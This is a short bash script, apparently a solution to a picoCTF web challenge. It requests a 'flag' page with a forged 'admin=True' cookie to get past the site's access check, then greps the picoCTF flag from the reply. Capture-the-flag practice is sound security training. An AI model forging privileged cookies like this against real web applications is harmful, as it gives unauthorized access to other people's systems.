if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null

webLink="$1flag"

curl "$webLink" \
-H "Cookie: admin=True" \
-s -o flag.html

flag=$(grep -o "picoCTF{.*}" --color=never flag.html)

popd > /dev/null

echo $flag
